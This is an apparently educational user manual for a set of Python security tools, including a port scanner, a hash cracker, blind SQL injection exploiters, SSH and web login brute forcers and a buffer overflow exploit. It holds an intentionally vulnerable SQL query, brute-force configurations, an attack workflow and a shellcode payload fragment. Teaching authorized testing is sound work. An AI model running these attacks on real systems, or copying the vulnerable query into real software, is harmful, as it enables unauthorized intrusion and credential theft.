# TCM Security Tools - Complete User Manual

[Русская версия](MANUAL.ru.md)

## Table of Contents

1. [Introduction](#introduction)
2. [Prerequisites](#prerequisites)
3. [Installation Guide](#installation-guide)
4. [Tool-by-Tool Guide](#tool-by-tool-guide)
5. [Advanced Usage](#advanced-usage)
6. [Troubleshooting](#troubleshooting)
7. [Best Practices](#best-practices)

---

## Introduction

This manual provides comprehensive instructions for using the TCM Security Python tools collection. Each tool is designed for educational purposes and authorized security testing.

### Important Security Notice

⚠️ **WARNING**: These tools are powerful and can cause harm if misused. Always:
- Obtain written permission before testing any system
- Use only in isolated lab environments or on systems you own
- Follow local laws and regulations
- Practice responsible disclosure

---

## Prerequisites

### System Requirements

- **Operating System**: Linux, macOS, or Windows (WSL recommended)
- **Python**: Version 3.7 or higher
- **RAM**: Minimum 2GB
- **Disk Space**: 500MB for tools and wordlists

### Required Knowledge

- Basic Python understanding
- Networking fundamentals (TCP/IP, ports)
- Command line proficiency
- Understanding of security concepts

---

## Installation Guide

### Step 1: Install Python

#### Linux (Debian/Ubuntu)
```bash
sudo apt update
sudo apt install python3 python3-pip
```

#### macOS
```bash
brew install python3
```

#### Windows
Download from [python.org](https://www.python.org/downloads/)

### Step 2: Clone Repository

```bash
git clone https://github.com/ranas-mukminov/tcm-guided-pyprojects.git
cd tcm-guided-pyprojects
```

### Step 3: Install Dependencies

```bash
# Install all required packages
pip3 install requests paramiko pwntools

# Or use requirements file
pip3 install -r requirements.txt
```

### Step 4: Download Wordlists

```bash
# RockYou wordlist (for hash cracking)
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Common SSH passwords
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt -O top-100.txt
```

---

## Tool-by-Tool Guide

### 1. Host Scanner (`host_scanner.py`)

**Purpose**: Scan target hosts for open TCP ports

**Features**:
- Multi-threaded scanning (100 concurrent workers)
- Scans all 65,535 ports
- Real-time port discovery
- Efficient resource management

#### Usage

```bash
python3 host_scanner.py <target>
```

#### Examples

**Scan localhost**:
```bash
python3 host_scanner.py 127.0.0.1
```

**Scan domain**:
```bash
python3 host_scanner.py example.com
```

#### Output Example

```
--------------------------------------------------
Scanning target 192.168.1.1
Time started: 2025-11-16 10:30:00.123456
--------------------------------------------------
Port 22 is open
Port 80 is open
Port 443 is open

Scan completed!
Found 3 open port(s)
Time finished: 2025-11-16 10:35:22.654321
```

#### Tips

- Scanning takes 5-10 minutes for all ports
- Use Ctrl+C to interrupt gracefully
- Adjust `max_workers` in code for faster/slower scanning

---

### 2. Password Strength Checker (`passwd-strength.py`)

**Purpose**: Validate password strength against security best practices

**Features**:
- Minimum length check (8 characters)
- Uppercase/lowercase validation
- Digit requirement
- Special character validation
- Common pattern detection
- Repeated character detection

#### Usage

```bash
python3 passwd-strength.py
```

#### Examples

**Weak password**:
```
--- Password Strength Checker ---
Enter your password: password123

✗ Password is weak!

Issues found:
  1. Password should contain at least one uppercase letter
  2. Password should contain at least one special character (!@#$%^&* etc.)
  3. Password contains a common pattern - avoid dictionary words
```

**Strong password**:
```
--- Password Strength Checker ---
Enter your password: MyP@ssw0rd!2024

✓ Password is strong!
Your password meets all security requirements.
```

#### Password Requirements

| Requirement | Description |
|-------------|-------------|
| Length | Minimum 8 characters (12+ recommended) |
| Uppercase | At least one A-Z |
| Lowercase | At least one a-z |
| Digits | At least one 0-9 |
| Special | At least one !@#$%^&*() etc. |
| Patterns | No common words/sequences |
| Repetition | No 3+ repeated characters |

---

### 3. SHA256 Hash Cracker (`sha256_cracking.py`)

**Purpose**: Crack SHA256 hashes using dictionary attack

**Features**:
- Dictionary-based attack
- Progress indicator
- Attempt counter
- Supports large wordlists (rockyou.txt)

#### Usage

```bash
python3 sha256_cracking.py <sha256_hash>
```

#### Examples

**Create a hash to crack**:
```bash
echo -n "password" | sha256sum
# Output: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
```

**Crack the hash**:
```bash
python3 sha256_cracking.py 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
```

#### Output Example

```
[*] Attempting to crack: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8!

[142] 123456 == 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92
[143] password == 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] Password hash found after 143 attempts! 'password' hashes to 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8!
```

#### Tips

- Ensure rockyou.txt is in the same directory
- Hash must be lowercase
- Larger wordlists = longer crack time
- Use for CTF challenges and educational purposes

---

### 4. SQL Injection Tools

Two variants available:
- **sql_injection_exploit.py**: Basic linear search method
- **exp_restrict_sql_injection.py**: Optimized binary search method

**Purpose**: Exploit blind SQL injection vulnerabilities

**Features**:
- Boolean-based blind SQL injection
- Password hash extraction
- User enumeration
- Query counter

#### Usage

```bash
python3 sql_injection_exploit.py
# or
python3 exp_restrict_sql_injection.py
```

#### Prerequisites

Set up a vulnerable web application:
```python
# Example Flask app (vulnerable.py)
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # VULNERABLE CODE - DO NOT USE IN PRODUCTION
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    # ... execute query
```

#### Configuration

Edit the target in the script:
```python
target = "http://127.0.0.1:5000"  # Change to your target
needle = "Welcome Back"            # Success message
```

#### Example Session

```
> Enter a user ID to extract the password hash: 1
	[-] User 1 hash length: 64
		[!] 142 total queries!
	[-] User 1 hash: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
		[!] 890 total queries!
```

#### Performance Comparison

| Method | Queries for 64-char hash |
|--------|--------------------------|
| Linear Search | ~900 queries |
| Binary Search | ~250 queries |

---

### 5. SSH Brute Forcer (`ssh_login_brute_forcing.py`)

**Purpose**: Brute force SSH login credentials

**Features**:
- Automated password testing
- Progress tracking
- Error handling
- MITM vulnerability warnings

#### ⚠️ Security Warning

This tool uses `AutoAddPolicy()` which accepts any SSH host key without verification. This creates a Man-in-the-Middle vulnerability. Only use in controlled environments.

#### Usage

```bash
python3 ssh_login_brute_forcing.py
```

#### Configuration

Edit credentials in the script:
```python
host = "127.0.0.1"                        # Target SSH server
username = "notroot"                      # Username to test
password_file = "ssh-common-passwords.txt" # Password wordlist
```

#### Example Output

```
[*] Starting SSH brute force attack
[*] Target: 192.168.1.100
[*] Username: admin
[*] Password list: ssh-common-passwords.txt
--------------------------------------------------
[0] Attempting password: 'admin'
[X] Invalid password
[1] Attempting password: 'password'
[X] Invalid password
[2] Attempting password: 'welcome123'
[>] Valid password found: 'welcome123'!
--------------------------------------------------
[*] Total attempts: 3
```

#### Tips

- Use rate limiting to avoid account lockout
- Test only on systems you own
- Common password lists available at SecLists
- Consider using Hydra for production testing

---

### 6. Web Login Brute Forcer (`web_login_form_brute_forcing.py`)

**Purpose**: Brute force HTTP POST login forms

**Features**:
- Multiple username support
- Network error handling (timeout, connection errors)
- Real-time progress display
- Customizable success detection

#### Usage

```bash
python3 web_login_form_brute_forcing.py
```

#### Configuration

```python
target = "http://127.0.0.1:5000"           # Target URL
usernames = ["admin", "user", "test"]      # Usernames to test
passwords_file = "top-100.txt"             # Password wordlist
needle = "Welcome Back"                    # Success indicator
```

#### Example Output

```
[*] Starting web login brute force attack
[*] Target: http://127.0.0.1:5000
[*] Password list: top-100.txt
--------------------------------------------------

[*] Testing username: admin
[X] Attempting user:password -> admin:password
	[>>>>>] Valid password 'password' found for user 'admin'!
```

#### Error Handling

The tool handles:
- **Timeouts**: Automatic retry
- **Connection errors**: Retry with notification
- **HTTP errors**: Display error and continue
- **File not found**: Clear error message

---

### 7. Buffer Overflow Exploit (`buffer_overflow.py`)

**Purpose**: Educational buffer overflow exploitation

**Features**:
- Automated exploit generation
- Gadget discovery
- Shellcode injection
- Debug mode support

#### ⚠️ Prerequisites

- Vulnerable binary: `executable_stack`
- GDB with pwndbg/peda (for debugging)
- 32-bit libraries (for i386 binaries)

#### Usage

```bash
python3 buffer_overflow.py
```

#### Workflow

1. **Find offset** (uncomment debug section):
```python
gdb.attach(io, 'continue')
pattern = cyclic(512)
io.sendline(pattern)
pause()
```

2. **Calculate offset in GDB**:
```
gdb> cyclic -l 0x61616161
140
```

3. **Update exploit**:
```python
exploit = flat([
    b"A" * 140,              # Offset to RET
    pack(jmp_esp),           # RET overwrite
    asm(shellcraft.sh())     # Shellcode
])
```

4. **Run exploit**:
```bash
python3 buffer_overflow.py
```

#### For Remote Targets

Uncomment and configure:
```python
io = remote('target.com', 9999)
```

---

## Advanced Usage

### Combining Tools

**Example workflow**: Audit a web application

```bash
# 1. Scan for open ports
python3 host_scanner.py target.com

# 2. If port 80/443 open, try web brute force
python3 web_login_form_brute_forcing.py

# 3. If database exposed, try SQL injection
python3 sql_injection_exploit.py

# 4. Extract password hashes
# (from SQL injection)

# 5. Crack the hashes
python3 sha256_cracking.py <hash>
```

### Customization

#### Modify Thread Count (host_scanner.py)

```python
# Change from 100 to 200 workers
with ThreadPoolExecutor(max_workers=200) as executor:
```

#### Add Custom Patterns (passwd-strength.py)

```python
common_patterns = ['password', '12345', 'qwerty', 'admin', 'letmein', 'mycustom']
```

#### Change Timeout (web_login_form_brute_forcing.py)

```python
r = requests.post(target, data={...}, timeout=10)  # 10 seconds
```

---

## Troubleshooting

### Common Issues

#### 1. "Module not found" error

**Problem**: Missing dependencies

**Solution**:
```bash
pip3 install --upgrade requests paramiko pwntools
```

#### 2. "Permission denied" on Linux

**Problem**: Script not executable

**Solution**:
```bash
chmod +x *.py
```

#### 3. "Connection timeout" in network tools

**Problem**: Firewall or unreachable target

**Solution**:
- Verify target is reachable: `ping target.com`
- Check firewall settings
- Increase timeout values

#### 4. "Too many open files" error

**Problem**: System file descriptor limit

**Solution**:
```bash
# Temporary fix
ulimit -n 4096

# Permanent fix (Linux)
sudo nano /etc/security/limits.conf
# Add: * soft nofile 4096
#      * hard nofile 8192
```

#### 5. SHA256 cracker not finding hash

**Problem**: Hash format or wordlist issue

**Solution**:
- Ensure hash is lowercase
- Verify rockyou.txt exists and is readable
- Try a smaller test wordlist first

### Debug Mode

Enable verbose output:
```bash
python3 -u script.py  # Unbuffered output
```

---

## Best Practices

### Ethical Guidelines

1. **Get Permission**: Always obtain written authorization
2. **Document Everything**: Keep logs of testing activities
3. **Respect Scope**: Only test agreed-upon targets
4. **Report Findings**: Responsibly disclose vulnerabilities
5. **No Harm**: Avoid causing damage or disruption

### Technical Best Practices

1. **Use VMs**: Test in isolated virtual environments
2. **Rate Limiting**: Don't overwhelm targets
3. **Logging**: Keep records of all actions
4. **Cleanup**: Remove any artifacts after testing
5. **Stay Updated**: Keep tools and dependencies current

### Legal Considerations

- **Unauthorized access is illegal** in most jurisdictions
- **Computer Fraud and Abuse Act (CFAA)** in the US
- **Computer Misuse Act** in the UK
- Penalties can include fines and imprisonment

### Responsible Disclosure

If you find vulnerabilities:
1. Document the vulnerability
2. Contact the vendor/owner privately
3. Give them time to patch (90 days standard)
4. Only publish after patch is available
5. Consider bug bounty programs

---

## Additional Resources

### Learning Materials

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [TryHackMe](https://tryhackme.com/)
- [HackTheBox](https://www.hackthebox.com/)

### Tool Documentation

- [Requests](https://docs.python-requests.org/)
- [Paramiko](http://docs.paramiko.org/)
- [Pwntools](https://docs.pwntools.com/)

### Wordlists

- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/tag/data)
- [FuzzDB](https://github.com/fuzzdb-project/fuzzdb)

---

## Support

For questions or issues:
- Open an issue on GitHub
- Check existing documentation
- Review the security audit report

**Remember**: With great power comes great responsibility. Use these tools ethically and legally.
